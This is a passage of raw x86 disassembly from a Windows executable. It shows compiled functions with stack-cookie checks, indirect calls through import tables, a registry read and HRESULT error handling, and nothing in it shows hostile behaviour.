  407cf5:	mov    DWORD PTR [ebp-0xeb8],ebx
  407cfb:	call   0x410ebe
  407d00:	lea    ecx,[ebp-0xec4]
  407d06:	call   0x405c45
  407d0b:	push   0x900
  407d10:	push   ecx
  407d11:	lea    eax,[ebp-0x130]
  407d17:	mov    DWORD PTR [ebp-0xec4],edi
  407d1d:	push   ecx
  407d1e:	push   eax
  407d1f:	lea    ecx,[esi+0x786]
  407d25:	mov    DWORD PTR [ebp-0xebc],eax
  407d2b:	mov    edx,0x81
  407d30:	mov    DWORD PTR [ebp-0xec0],eax
  407d36:	mov    DWORD PTR [ebp-0xeb8],ebx
  407d3c:	call   0x410ebe
  407d41:	lea    ecx,[ebp-0xec4]
  407d47:	call   0x405c45
  407d4c:	push   0x900
  407d51:	push   ecx
  407d52:	lea    eax,[ebp-0x338]
  407d58:	mov    DWORD PTR [ebp-0xec4],edi
  407d5e:	push   ecx
  407d5f:	push   eax
  407d60:	lea    ecx,[esi+0xdc4]
  407d66:	mov    DWORD PTR [ebp-0xebc],eax
  407d6c:	mov    edx,0x104
  407d71:	mov    DWORD PTR [ebp-0xec0],eax
  407d77:	mov    DWORD PTR [ebp-0xeb8],ebx
  407d7d:	call   0x410ebe
  407d82:	lea    ecx,[ebp-0xec4]
  407d88:	call   0x405c45
  407d8d:	mov    edi,DWORD PTR [esi]
  407d8f:	mov    ecx,esi
  407d91:	mov    edx,edi
  407d93:	call   0x40f355
  407d98:	mov    DWORD PTR [ebp-0xeac],eax
  407d9e:	test   eax,eax
  407da0:	je     0x407dea
  407da2:	mov    eax,DWORD PTR [ebp-0xec8]
  407da8:	lea    ecx,[ebp-0xeac]
  407dae:	push   edi
  407daf:	push   ecx
  407db0:	push   DWORD PTR [ebp-0xeb4]
  407db6:	mov    esi,DWORD PTR [eax]
  407db8:	push   DWORD PTR [ebp-0xecc]
  407dbe:	push   eax
  407dbf:	mov    ecx,DWORD PTR [esi+0x10]
  407dc2:	call   DWORD PTR ds:0x414220
  407dc8:	call   DWORD PTR [esi+0x10]
  407dcb:	push   DWORD PTR [ebp-0xeac]
  407dd1:	mov    edi,eax
  407dd3:	and    edi,0xffff
  407dd9:	call   DWORD PTR ds:0x4141bc
  407ddf:	mov    esi,DWORD PTR [ebp-0xeb0]
  407de5:	jmp    0x407e83
  407dea:	mov    edi,ebx
  407dec:	jmp    0x407e83
  407df1:	test   esi,esi
  407df3:	je     0x407bba
  407df9:	push   edi
  407dfa:	push   ebx
  407dfb:	push   esi
  407dfc:	call   0x412060
  407e01:	add    esp,0xc
  407e04:	mov    DWORD PTR [esi],edi
  407e06:	mov    edi,0x900
  407e0b:	mov    DWORD PTR [esi+0xda8],0x4
  407e15:	lea    eax,[ebp-0x28]
  407e18:	push   edi
  407e19:	push   ecx
  407e1a:	push   ecx
  407e1b:	push   eax
  407e1c:	push   0x11
  407e1e:	lea    ecx,[esi+0x764]
  407e24:	pop    edx
  407e25:	call   0x410ebe
  407e2a:	push   edi
  407e2b:	push   ecx
  407e2c:	push   ecx
  407e2d:	lea    eax,[ebp-0x130]
  407e33:	mov    edx,0x81
  407e38:	push   eax
  407e39:	lea    ecx,[esi+0x786]
  407e3f:	call   0x410ebe
  407e44:	push   edi
  407e45:	push   ecx
  407e46:	push   ecx
  407e47:	lea    eax,[ebp-0x338]
  407e4d:	mov    edx,0x104
  407e52:	push   eax
  407e53:	lea    ecx,[esi+0xdc4]
  407e59:	call   0x410ebe
  407e5e:	mov    ecx,DWORD PTR [ebp-0xeac]
  407e64:	push   ebx
  407e65:	push   ebx
  407e66:	push   DWORD PTR [esi]
  407e68:	push   esi
  407e69:	push   DWORD PTR [ebp-0xeb4]
  407e6f:	push   DWORD PTR [ebp-0xecc]
  407e75:	call   DWORD PTR ds:0x414220
  407e7b:	call   DWORD PTR [ebp-0xeac]
  407e81:	mov    edi,eax
  407e83:	push   esi
  407e84:	call   DWORD PTR ds:0x4141bc
  407e8a:	test   edi,edi
  407e8c:	jne    0x407e93
  407e8e:	xor    ebx,ebx
  407e90:	inc    ebx
  407e91:	jmp    0x407ea7
  407e93:	push   edi
  407e94:	push   0x4020a8
  407e99:	push   DWORD PTR ds:0x4130e8
  407e9f:	call   0x40e818
  407ea4:	add    esp,0xc
  407ea7:	mov    eax,ebx
  407ea9:	jmp    0x407ead
  407eab:	xor    eax,eax
  407ead:	mov    ecx,DWORD PTR [ebp-0x4]
  407eb0:	pop    edi
  407eb1:	pop    esi
  407eb2:	xor    ecx,ebp
  407eb4:	pop    ebx
  407eb5:	call   0x411980
  407eba:	mov    esp,ebp
  407ebc:	pop    ebp
  407ebd:	ret    0x8
  407ec0:	call   0x411ad9
  407ec5:	int3   
  407ec6:	int3   
  407ec7:	int3   
  407ec8:	int3   
  407ec9:	int3   
  407eca:	int3   
  407ecb:	mov    edi,edi
  407ecd:	push   ebp
  407ece:	mov    ebp,esp
  407ed0:	sub    esp,0x10
  407ed3:	mov    eax,ds:0x413004
  407ed8:	xor    eax,ebp
  407eda:	mov    DWORD PTR [ebp-0x4],eax
  407edd:	push   ebx
  407ede:	push   edi
  407edf:	mov    edi,ecx
  407ee1:	mov    ebx,edx
  407ee3:	test   edi,edi
  407ee5:	jne    0x407eee
  407ee7:	xor    eax,eax
  407ee9:	jmp    0x407fb3
  407eee:	push   esi
  407eef:	xor    esi,esi
  407ef1:	mov    DWORD PTR [edi],esi
  407ef3:	test   ebx,ebx
  407ef5:	je     0x407ef9
  407ef7:	mov    DWORD PTR [ebx],esi
  407ef9:	push   esi
  407efa:	push   esi
  407efb:	lea    eax,[ebp-0xc]
  407efe:	xor    edx,edx
  407f00:	push   eax
  407f01:	push   esi
  407f02:	xor    ecx,ecx
  407f04:	call   0x4086b2
  407f09:	test   eax,eax
  407f0b:	je     0x407fb0
  407f11:	mov    ecx,DWORD PTR [ebp-0xc]
  407f14:	lea    eax,[ebp-0x10]
  407f17:	push   eax
  407f18:	lea    eax,[ebp-0x8]
  407f1b:	mov    DWORD PTR [ebp-0x8],esi
  407f1e:	push   eax
  407f1f:	push   esi
  407f20:	call   DWORD PTR ds:0x414220
  407f26:	call   DWORD PTR [ebp-0xc]
  407f29:	push   DWORD PTR [ebp-0x10]
  407f2c:	mov    esi,eax
  407f2e:	push   DWORD PTR [ebp-0x8]
  407f31:	push   esi
  407f32:	push   0x402138
  407f37:	push   DWORD PTR ds:0x4130e8
  407f3d:	call   0x40e818
  407f42:	add    esp,0x14
  407f45:	test   esi,esi
  407f47:	je     0x407f51
  407f49:	cmp    esi,0x25b
  407f4f:	jne    0x407fb0
  407f51:	mov    eax,DWORD PTR [ebp-0x8]
  407f54:	mov    esi,0x128
  407f59:	cmp    eax,esi
  407f5b:	jb     0x407fb0
  407f5d:	ja     0x407f61
  407f5f:	mov    eax,esi
  407f61:	push   eax
  407f62:	call   DWORD PTR ds:0x4141b0
  407f68:	mov    DWORD PTR [edi],eax
  407f6a:	test   eax,eax
  407f6c:	je     0x407fb0
  407f6e:	lea    ecx,[ebp-0x10]
  407f71:	mov    DWORD PTR [eax],esi
  407f73:	push   ecx
  407f74:	lea    ecx,[ebp-0x8]
  407f77:	push   ecx
  407f78:	mov    ecx,DWORD PTR [ebp-0xc]
  407f7b:	push   eax
  407f7c:	call   DWORD PTR ds:0x414220
  407f82:	call   DWORD PTR [ebp-0xc]
  407f85:	push   DWORD PTR [ebp-0x10]
  407f88:	mov    esi,eax
  407f8a:	push   DWORD PTR [ebp-0x8]
  407f8d:	push   esi
  407f8e:	push   0x402138
  407f93:	push   DWORD PTR ds:0x4130e8
  407f99:	call   0x40e818
  407f9e:	add    esp,0x14
  407fa1:	test   esi,esi
  407fa3:	je     0x407fc3
  407fa5:	push   DWORD PTR [edi]
  407fa7:	call   DWORD PTR ds:0x4141bc
  407fad:	and    DWORD PTR [edi],0x0
  407fb0:	xor    eax,eax
  407fb2:	pop    esi
  407fb3:	mov    ecx,DWORD PTR [ebp-0x4]
  407fb6:	pop    edi
  407fb7:	xor    ecx,ebp
  407fb9:	pop    ebx
  407fba:	call   0x411980
  407fbf:	mov    esp,ebp
  407fc1:	pop    ebp
  407fc2:	ret    
  407fc3:	test   ebx,ebx
  407fc5:	je     0x407fcc
  407fc7:	mov    eax,DWORD PTR [ebp-0x10]
  407fca:	mov    DWORD PTR [ebx],eax
  407fcc:	xor    eax,eax
  407fce:	inc    eax
  407fcf:	jmp    0x407fb2
  407fd1:	int3   
  407fd2:	int3   
  407fd3:	int3   
  407fd4:	int3   
  407fd5:	int3   
  407fd6:	mov    edi,edi
  407fd8:	push   ebp
  407fd9:	mov    ebp,esp
  407fdb:	sub    esp,0x150
  407fe1:	mov    eax,ds:0x413004
  407fe6:	xor    eax,ebp
  407fe8:	mov    DWORD PTR [ebp-0x4],eax
  407feb:	mov    eax,DWORD PTR [ebp+0x8]
  407fee:	lea    edx,[ebp-0x144]
  407ff4:	mov    DWORD PTR [ebp-0x14c],ecx
  407ffa:	lea    ecx,[ebp-0x148]
  408000:	push   edi
  408001:	mov    DWORD PTR [ebp-0x150],eax
  408007:	call   0x407ecb
  40800c:	test   eax,eax
  40800e:	je     0x40811f
  408014:	mov    edi,DWORD PTR [ebp-0x144]
  40801a:	test   edi,edi
  40801c:	je     0x40811f
  408022:	push   ebx
  408023:	xor    ebx,ebx
  408025:	test   edi,edi
  408027:	je     0x40810a
  40802d:	mov    eax,DWORD PTR [ebp-0x148]
  408033:	add    eax,0x4
  408036:	mov    DWORD PTR [ebp-0x144],eax
  40803c:	push   esi
  40803d:	lea    ecx,[ebp-0x140]
  408043:	call   0x40fa55
  408048:	lea    ecx,[ebp-0x140]
  40804e:	call   0x40fab7
  408053:	mov    esi,eax
  408055:	neg    esi
  408057:	push   0xffffffff
  408059:	sbb    esi,esi
  40805b:	and    esi,0xfffffc76
  408061:	add    esi,0x409
  408067:	cmp    DWORD PTR [ebp+0x10],0x0
  40806b:	je     0x408074
  40806d:	push   0x4021dc
  408072:	jmp    0x408096
  408074:	push   0x4021e4
  408079:	push   0xffffffff
  40807b:	push   DWORD PTR [ebp-0x144]
  408081:	push   0x1
  408083:	push   esi
  408084:	call   DWORD PTR ds:0x414060
  40808a:	cmp    eax,0x2
  40808d:	je     0x4080bb
  40808f:	push   0xffffffff
  408091:	push   0x401fa4
  408096:	push   0xffffffff
  408098:	push   DWORD PTR [ebp-0x144]
  40809e:	push   0x1
  4080a0:	push   esi
  4080a1:	call   DWORD PTR ds:0x414060
  4080a7:	cmp    eax,0x2
  4080aa:	je     0x4080bb
  4080ac:	add    DWORD PTR [ebp-0x144],0x128
  4080b6:	inc    ebx
  4080b7:	cmp    ebx,edi
  4080b9:	jb     0x40803d
  4080bb:	cmp    ebx,edi
  4080bd:	jae    0x408109
  4080bf:	mov    eax,DWORD PTR [ebp-0x148]
  4080c5:	push   0x900
  4080ca:	push   ecx
  4080cb:	imul   esi,ebx,0x128
  4080d1:	add    eax,0x4
  4080d4:	push   ecx
  4080d5:	mov    ecx,DWORD PTR [ebp-0x14c]
  4080db:	add    eax,esi
  4080dd:	push   eax
  4080de:	push   0x11
  4080e0:	pop    edx
  4080e1:	call   0x410ebe
  4080e6:	mov    eax,DWORD PTR [ebp-0x148]
  4080ec:	mov    edx,0x81
  4080f1:	push   0x900
  4080f6:	push   ecx
  4080f7:	add    eax,0x26
  4080fa:	push   ecx
  4080fb:	mov    ecx,DWORD PTR [ebp-0x150]
  408101:	add    eax,esi
  408103:	push   eax
  408104:	call   0x410ebe
  408109:	pop    esi
  40810a:	push   DWORD PTR [ebp-0x148]
  408110:	call   DWORD PTR ds:0x4141bc
  408116:	cmp    ebx,edi
  408118:	pop    ebx
  408119:	sbb    eax,eax
  40811b:	neg    eax
  40811d:	jmp    0x408121
  40811f:	xor    eax,eax
  408121:	mov    ecx,DWORD PTR [ebp-0x4]
  408124:	xor    ecx,ebp
  408126:	pop    edi
  408127:	call   0x411980
  40812c:	mov    esp,ebp
  40812e:	pop    ebp
  40812f:	ret    0xc
  408132:	int3   
  408133:	int3   
  408134:	int3   
  408135:	int3   
  408136:	int3   
  408137:	mov    edi,edi
  408139:	push   ebp
  40813a:	mov    ebp,esp
  40813c:	sub    esp,0xc
  40813f:	mov    eax,ds:0x413004
  408144:	xor    eax,ebp
  408146:	mov    DWORD PTR [ebp-0x4],eax
  408149:	push   esi
  40814a:	push   edi
  40814b:	mov    esi,edx
  40814d:	mov    edi,ecx
  40814f:	xor    edx,edx
  408151:	lea    ecx,[ebp-0x8]
  408154:	call   0x4088cd
  408159:	test   eax,eax
  40815b:	jne    0x408164
  40815d:	mov    eax,0x8000ffff
  408162:	jmp    0x40819d
  408164:	lea    eax,[ebp-0xc]
  408167:	push   eax
  408168:	push   0x8
  40816a:	call   DWORD PTR ds:0x414054
  408170:	push   eax
  408171:	call   DWORD PTR ds:0x41400c
  408177:	test   eax,eax
  408179:	je     0x40815d
  40817b:	mov    ecx,DWORD PTR [ebp-0x8]
  40817e:	push   esi
  40817f:	push   0x0
  408181:	push   DWORD PTR [ebp-0xc]
  408184:	push   edi
  408185:	push   0x0
  408187:	call   DWORD PTR ds:0x414220
  40818d:	call   DWORD PTR [ebp-0x8]
  408190:	push   DWORD PTR [ebp-0xc]
  408193:	mov    esi,eax
  408195:	call   DWORD PTR ds:0x414084
  40819b:	mov    eax,esi
  40819d:	mov    ecx,DWORD PTR [ebp-0x4]
  4081a0:	pop    edi
  4081a1:	xor    ecx,ebp
  4081a3:	pop    esi
  4081a4:	call   0x411980
  4081a9:	mov    esp,ebp
  4081ab:	pop    ebp
  4081ac:	ret    
  4081ad:	int3   
  4081ae:	int3   
  4081af:	int3   
  4081b0:	int3   
  4081b1:	int3   
  4081b2:	mov    edi,edi
  4081b4:	push   ebp
  4081b5:	mov    ebp,esp
  4081b7:	sub    esp,0x558
  4081bd:	mov    eax,ds:0x413004
  4081c2:	xor    eax,ebp
  4081c4:	mov    DWORD PTR [ebp-0x4],eax
  4081c7:	push   esi
  4081c8:	xor    eax,eax
  4081ca:	mov    esi,ecx
  4081cc:	push   0x208
  4081d1:	push   eax
  4081d2:	mov    WORD PTR [ebp-0x210],ax
  4081d9:	lea    eax,[ebp-0x20e]
  4081df:	push   eax
  4081e0:	call   0x412060
  4081e5:	add    esp,0xc
  4081e8:	lea    ecx,[ebp-0x558]
  4081ee:	call   0x40fa55
  4081f3:	test   esi,esi
  4081f5:	je     0x40825e
  4081f7:	xor    eax,eax
  4081f9:	cmp    ax,WORD PTR [esi]
  4081fc:	je     0x40825e
  4081fe:	push   0x1a
  408200:	lea    edx,[ebp-0x41c]
  408206:	pop    ecx
  408207:	call   0x408137
  40820c:	test   eax,eax
  40820e:	jns    0x408217
  408210:	mov    eax,0x8000ffff
  408215:	jmp    0x408263
  408217:	lea    eax,[ebp-0x41c]
  40821d:	push   eax
  40821e:	call   DWORD PTR ds:0x414068
  408224:	sub    esp,0xc
  408227:	lea    ecx,[ebp-0x210]
  40822d:	mov    edx,0x105
  408232:	push   eax
  408233:	push   esi
  408234:	call   0x410ef7
  408239:	test   eax,eax
  40823b:	js     0x408263
  40823d:	lea    eax,[ebp-0x210]
  408243:	test   eax,eax
  408245:	je     0x408259
  408247:	push   eax
  408248:	lea    eax,[ebp-0x41c]
  40824e:	push   eax
  40824f:	call   DWORD PTR ds:0x41407c
  408255:	test   eax,eax
  408257:	je     0x408263
  408259:	xor    eax,eax
  40825b:	inc    eax
  40825c:	jmp    0x408263
  40825e:	mov    eax,0x80004003
  408263:	mov    ecx,DWORD PTR [ebp-0x4]
  408266:	xor    ecx,ebp
  408268:	pop    esi
  408269:	call   0x411980
  40826e:	mov    esp,ebp
  408270:	pop    ebp
  408271:	ret    
  408272:	int3   
  408273:	int3   
  408274:	int3   
  408275:	int3   
  408276:	int3   
  408277:	mov    edi,edi
  408279:	push   ebp
  40827a:	mov    ebp,esp
  40827c:	sub    esp,0xc
  40827f:	mov    eax,ds:0x413004
  408284:	xor    eax,ebp
  408286:	mov    DWORD PTR [ebp-0x4],eax
  408289:	push   esi
  40828a:	lea    eax,[ebp-0xc]
  40828d:	xor    esi,esi
  40828f:	push   eax
  408290:	mov    DWORD PTR [ebp-0xc],esi
  408293:	mov    DWORD PTR [ebp-0x8],esi
  408296:	call   DWORD PTR ds:0x41413c
  40829c:	test   eax,eax
  40829e:	js     0x4082e9
  4082a0:	lea    eax,[ebp-0x8]
  4082a3:	push   eax
  4082a4:	push   esi
  4082a5:	push   esi
  4082a6:	call   DWORD PTR ds:0x41414c
  4082ac:	test   eax,eax
  4082ae:	js     0x4082d6
  4082b0:	push   esi
  4082b1:	push   DWORD PTR [ebp-0x8]
  4082b4:	push   esi
  4082b5:	push   0x1000
  4082ba:	call   DWORD PTR ds:0x414134
  4082c0:	mov    eax,DWORD PTR [ebp-0xc]
  4082c3:	push   DWORD PTR [ebp-0x8]
  4082c6:	push   eax
  4082c7:	mov    ecx,DWORD PTR [eax]
  4082c9:	mov    esi,DWORD PTR [ecx+0x14]
  4082cc:	mov    ecx,esi
  4082ce:	call   DWORD PTR ds:0x414220
  4082d4:	call   esi
  4082d6:	mov    eax,DWORD PTR [ebp-0xc]
  4082d9:	push   eax
  4082da:	mov    ecx,DWORD PTR [eax]
  4082dc:	mov    esi,DWORD PTR [ecx+0x8]
  4082df:	mov    ecx,esi
  4082e1:	call   DWORD PTR ds:0x414220
  4082e7:	call   esi
  4082e9:	mov    ecx,DWORD PTR [ebp-0x4]
  4082ec:	xor    ecx,ebp
  4082ee:	pop    esi
  4082ef:	call   0x411980
  4082f4:	mov    esp,ebp
  4082f6:	pop    ebp
  4082f7:	ret    
  4082f8:	int3   
  4082f9:	int3   
  4082fa:	int3   
  4082fb:	int3   
  4082fc:	int3   
  4082fd:	mov    edi,edi
  4082ff:	push   ebp
  408300:	mov    ebp,esp
  408302:	sub    esp,0x160
  408308:	mov    eax,ds:0x413004
  40830d:	xor    eax,ebp
  40830f:	mov    DWORD PTR [ebp-0x4],eax
  408312:	push   ebx
  408313:	push   esi
  408314:	mov    esi,ecx
  408316:	mov    DWORD PTR [ebp-0x144],edx
  40831c:	push   edi
  40831d:	mov    edi,DWORD PTR [ebp+0x8]
  408320:	lea    ecx,[ebp-0x140]
  408326:	call   0x40fa55
  40832b:	mov    ebx,0x80004005
  408330:	test   esi,esi
  408332:	je     0x4084eb
  408338:	cmp    DWORD PTR [ebp-0x144],0x0
  40833f:	je     0x4084eb
  408345:	test   edi,edi
  408347:	je     0x408354
  408349:	xor    eax,eax
  40834b:	cmp    ax,WORD PTR [edi]
  40834e:	je     0x4084eb
  408354:	xor    ecx,ecx
  408356:	lea    eax,[ebp-0x148]
  40835c:	push   ecx
  40835d:	push   eax
  40835e:	push   ecx
  40835f:	push   ecx
  408360:	xor    edx,edx
  408362:	mov    DWORD PTR [ebp-0x148],ecx
  408368:	call   0x4086b2
  40836d:	test   eax,eax
  40836f:	jne    0x40837b
  408371:	mov    eax,0x8000ffff
  408376:	jmp    0x4084f0
  40837b:	push   0x1618
  408380:	call   DWORD PTR ds:0x4141b0
  408386:	mov    esi,eax
  408388:	test   esi,esi
  40838a:	je     0x4084cc
  408390:	push   0x1618
  408395:	push   0x0
  408397:	push   esi
  408398:	call   0x412060
  40839d:	mov    ecx,DWORD PTR [ebp-0x148]
  4083a3:	add    esp,0xc
  4083a6:	mov    eax,0x1618
  4083ab:	mov    DWORD PTR [esi],eax
  4083ad:	mov    DWORD PTR [ebp-0x14c],eax
  4083b3:	lea    eax,[ebp-0x14c]
  4083b9:	push   0x0
  4083bb:	push   0x0
  4083bd:	push   eax
  4083be:	push   esi
  4083bf:	push   DWORD PTR [ebp-0x144]
  4083c5:	push   edi
  4083c6:	call   DWORD PTR ds:0x414220
  4083cc:	call   DWORD PTR [ebp-0x148]
  4083d2:	cmp    eax,0x25b
  4083d7:	jne    0x408427
  4083d9:	push   esi
  4083da:	call   DWORD PTR ds:0x4141bc
  4083e0:	push   DWORD PTR [ebp-0x14c]
  4083e6:	call   DWORD PTR ds:0x4141b0
  4083ec:	mov    esi,eax
  4083ee:	test   esi,esi
  4083f0:	jne    0x4083fc
  4083f2:	mov    eax,0x8007000e
  4083f7:	jmp    0x4084f0
  4083fc:	mov    ecx,DWORD PTR [ebp-0x148]
  408402:	lea    eax,[ebp-0x14c]
  408408:	push   0x0
  40840a:	push   0x0
  40840c:	push   eax
  40840d:	push   esi
  40840e:	push   DWORD PTR [ebp-0x144]
  408414:	mov    DWORD PTR [esi],0x1618
  40841a:	push   edi
  40841b:	call   DWORD PTR ds:0x414220
  408421:	call   DWORD PTR [ebp-0x148]
  408427:	test   eax,eax
  408429:	jne    0x4084d0
  40842f:	lea    ecx,[ebp-0x140]
  408435:	call   0x40fab7
  40843a:	and    DWORD PTR [ebp-0x144],0x0
  408441:	xor    edx,edx
  408443:	test   eax,eax
  408445:	je     0x408478
  408447:	lea    eax,[ebp-0x144]
  40844d:	xor    ecx,ecx
  40844f:	push   eax
  408450:	call   0x408566
  408455:	test   eax,eax
  408457:	je     0x4084c5
  408459:	mov    ecx,DWORD PTR [ebp-0x144]
  40845f:	lea    eax,[esi+0xdb4]
  408465:	push   eax
  408466:	push   0x1
  408468:	call   DWORD PTR ds:0x414220
  40846e:	call   DWORD PTR [ebp-0x144]
  408474:	mov    ebx,eax
  408476:	jmp    0x4084c5
  408478:	push   0x0
  40847a:	lea    ecx,[ebp-0x144]
  408480:	call   0x408566
  408485:	test   eax,eax
  408487:	je     0x4084c5
  408489:	lea    ecx,[ebp-0x160]
  40848f:	call   0x40c6fb
  408494:	lea    ecx,[ebp-0x160]
  40849a:	call   0x40c877
  40849f:	mov    ecx,DWORD PTR [ebp-0x144]
  4084a5:	lea    eax,[esi+0xdb4]
  4084ab:	push   eax
  4084ac:	call   DWORD PTR ds:0x414220
  4084b2:	call   DWORD PTR [ebp-0x144]
  4084b8:	lea    ecx,[ebp-0x160]
  4084be:	mov    ebx,eax
  4084c0:	call   0x40c7c6
  4084c5:	push   esi
  4084c6:	call   DWORD PTR ds:0x4141bc
  4084cc:	mov    eax,ebx
  4084ce:	jmp    0x4084f0
  4084d0:	push   eax
  4084d1:	push   0x4021f0
  4084d6:	push   DWORD PTR ds:0x4130e8
  4084dc:	call   0x40e818
  4084e1:	add    esp,0xc
  4084e4:	mov    eax,0x800704cd
  4084e9:	jmp    0x4084f0
  4084eb:	mov    eax,0x80070057
  4084f0:	mov    ecx,DWORD PTR [ebp-0x4]
  4084f3:	pop    edi
  4084f4:	pop    esi
  4084f5:	xor    ecx,ebp
  4084f7:	pop    ebx
  4084f8:	call   0x411980
  4084fd:	mov    esp,ebp
  4084ff:	pop    ebp
  408500:	ret    0x8
  408503:	int3   
  408504:	int3   
  408505:	int3   
  408506:	int3   
  408507:	int3   
  408508:	mov    edi,edi
  40850a:	push   ebp
  40850b:	mov    ebp,esp
  40850d:	push   ecx
  40850e:	push   ecx
  40850f:	push   esi
  408510:	lea    eax,[ebp-0x4]
  408513:	xor    esi,esi
  408515:	push   eax
  408516:	push   0x20019
  40851b:	push   esi
  40851c:	push   0x401588
  408521:	push   0x80000002
  408526:	call   DWORD PTR ds:0x414004
  40852c:	test   eax,eax
  40852e:	jne    0x40855a
  408530:	push   esi
  408531:	push   esi
  408532:	push   esi
  408533:	push   esi
  408534:	lea    eax,[ebp-0x8]
  408537:	push   eax
  408538:	push   esi
  408539:	push   esi
  40853a:	push   esi
  40853b:	push   esi
  40853c:	push   esi
  40853d:	push   esi
  40853e:	push   DWORD PTR [ebp-0x4]
  408541:	call   DWORD PTR ds:0x414010
  408547:	test   eax,eax
  408549:	jne    0x408551
  40854b:	cmp    DWORD PTR [ebp-0x8],esi
  40854e:	jbe    0x408551
  408550:	inc    esi
  408551:	push   DWORD PTR [ebp-0x4]
  408554:	call   DWORD PTR ds:0x414008
  40855a:	mov    eax,esi
  40855c:	pop    esi
  40855d:	mov    esp,ebp
  40855f:	pop    ebp
  408560:	ret    
  408561:	int3   
  408562:	int3   
  408563:	int3   
  408564:	int3   
  408565:	int3   
  408566:	mov    edi,edi
  408568:	push   ebp
  408569:	mov    ebp,esp
  40856b:	sub    esp,0x148
  408571:	mov    eax,ds:0x413004
  408576:	xor    eax,ebp
  408578:	mov    DWORD PTR [ebp-0x4],eax
  40857b:	mov    eax,DWORD PTR [ebp+0x8]
  40857e:	push   ebx
  40857f:	mov    ebx,ecx
  408581:	mov    DWORD PTR [ebp-0x148],edx
  408587:	push   esi
  408588:	lea    ecx,[ebp-0x140]
  40858e:	mov    DWORD PTR [ebp-0x144],eax
  408594:	call   0x40fa55
  408599:	mov    esi,DWORD PTR ds:0x413470
  40859f:	test   esi,esi
  4085a1:	jne    0x4085bb
  4085a3:	push   0x4
  4085a5:	call   DWORD PTR ds:0x4141b0
  4085ab:	mov    esi,eax
  4085ad:	mov    DWORD PTR ds:0x413470,esi
  4085b3:	test   esi,esi
  4085b5:	je     0x40869b
  4085bb:	push   edi
  4085bc:	xor    edi,edi
  4085be:	cmp    DWORD PTR [esi],edi
  4085c0:	jne    0x4085d4
  4085c2:	push   0x402258
  4085c7:	mov    ecx,esi
  4085c9:	call   0x405ca6
  4085ce:	mov    esi,DWORD PTR ds:0x413470
  4085d4:	test   ebx,ebx
  4085d6:	je     0x408610
  4085d8:	mov    eax,ds:0x41349c
  4085dd:	test   eax,eax
  4085df:	je     0x4085e5
  4085e1:	mov    DWORD PTR [ebx],eax
  4085e3:	jmp    0x408610
  4085e5:	mov    eax,DWORD PTR [esi]
  4085e7:	test   eax,eax
  4085e9:	je     0x4085ff
  4085eb:	push   0x402274
  4085f0:	push   eax
  4085f1:	call   DWORD PTR ds:0x414048
  4085f7:	mov    esi,DWORD PTR ds:0x413470
  4085fd:	jmp    0x408601
  4085ff:	mov    eax,edi
  408601:	mov    DWORD PTR [ebx],eax
  408603:	test   eax,eax
  408605:	je     0x40868d
  40860b:	mov    ds:0x41349c,eax
  408610:	mov    ebx,DWORD PTR [ebp-0x148]
  408616:	test   ebx,ebx
  408618:	je     0x40864e
  40861a:	mov    eax,ds:0x413488
  40861f:	test   eax,eax
  408621:	je     0x408627
  408623:	mov    DWORD PTR [ebx],eax
  408625:	jmp    0x40864e
  408627:	mov    eax,DWORD PTR [esi]
  408629:	test   eax,eax
  40862b:	je     0x408641
  40862d:	push   0x402288
  408632:	push   eax
  408633:	call   DWORD PTR ds:0x414048
  408639:	mov    esi,DWORD PTR ds:0x413470
  40863f:	jmp    0x408643
  408641:	mov    eax,edi
  408643:	mov    DWORD PTR [ebx],eax
  408645:	test   eax,eax
  408647:	je     0x40868d
  408649:	mov    ds:0x413488,eax
  40864e:	mov    ebx,DWORD PTR [ebp-0x144]
  408654:	test   ebx,ebx
  408656:	je     0x408697
  408658:	mov    eax,ds:0x413480
  40865d:	test   eax,eax
  40865f:	je     0x408665
  408661:	mov    DWORD PTR [ebx],eax
  408663:	jmp    0x408697
  408665:	lea    ecx,[ebp-0x140]
  40866b:	call   0x40fab7
  408670:	test   eax,eax
  408672:	je     0x40868d
  408674:	cmp    DWORD PTR [esi],edi
  408676:	je     0x408687
  408678:	push   0x40229c
  40867d:	push   DWORD PTR [esi]
  40867f:	call   DWORD PTR ds:0x414048
  408685:	mov    edi,eax
  408687:	mov    DWORD PTR [ebx],edi
  408689:	test   edi,edi
  40868b:	jne    0x408691
  40868d:	xor    eax,eax
  40868f:	jmp    0x40869a
  408691:	mov    DWORD PTR ds:0x413480,edi
  408697:	xor    eax,eax
  408699:	inc    eax
  40869a:	pop    edi
  40869b:	mov    ecx,DWORD PTR [ebp-0x4]
  40869e:	pop    esi
  40869f:	xor    ecx,ebp
  4086a1:	pop    ebx
  4086a2:	call   0x411980
  4086a7:	mov    esp,ebp
  4086a9:	pop    ebp
  4086aa:	ret    0x4
  4086ad:	int3   
  4086ae:	int3   
  4086af:	int3   
  4086b0:	int3   
  4086b1:	int3   
  4086b2:	mov    edi,edi
  4086b4:	push   ebp
  4086b5:	mov    ebp,esp
  4086b7:	sub    esp,0x150
  4086bd:	mov    eax,ds:0x413004
  4086c2:	xor    eax,ebp
  4086c4:	mov    DWORD PTR [ebp-0x4],eax
  4086c7:	mov    eax,DWORD PTR [ebp+0x8]
  4086ca:	mov    DWORD PTR [ebp-0x14c],eax
  4086d0:	mov    eax,DWORD PTR [ebp+0xc]
  4086d3:	push   ebx
  4086d4:	mov    DWORD PTR [ebp-0x150],eax
  4086da:	mov    ebx,edx
  4086dc:	mov    eax,DWORD PTR [ebp+0x10]
  4086df:	push   edi
  4086e0:	mov    edi,ecx
  4086e2:	mov    DWORD PTR [ebp-0x144],eax
  4086e8:	mov    eax,DWORD PTR [ebp+0x14]
  4086eb:	lea    ecx,[ebp-0x140]
  4086f1:	mov    DWORD PTR [ebp-0x148],eax
  4086f7:	call   0x40fa55
  4086fc:	mov    eax,ds:0x413474
  408701:	test   eax,eax
  408703:	jne    0x40871a
  408705:	push   0x4
  408707:	call   DWORD PTR ds:0x4141b0
  40870d:	mov    ds:0x413474,eax
  408712:	test   eax,eax
  408714:	je     0x4088b6
  40871a:	push   esi
  40871b:	xor    esi,esi
  40871d:	cmp    DWORD PTR [eax],esi
  40871f:	jne    0x408732
  408721:	push   0x4022b4
  408726:	mov    ecx,eax
  408728:	call   0x405ca6
  40872d:	mov    eax,ds:0x413474
  408732:	test   edi,edi
  408734:	je     0x408771
  408736:	mov    ecx,DWORD PTR ds:0x413490
  40873c:	test   ecx,ecx
  40873e:	je     0x408744
  408740:	mov    DWORD PTR [edi],ecx
  408742:	jmp    0x408771
  408744:	mov    ecx,DWORD PTR [eax]
  408746:	test   ecx,ecx
  408748:	je     0x40875f
  40874a:	push   0x4022d0
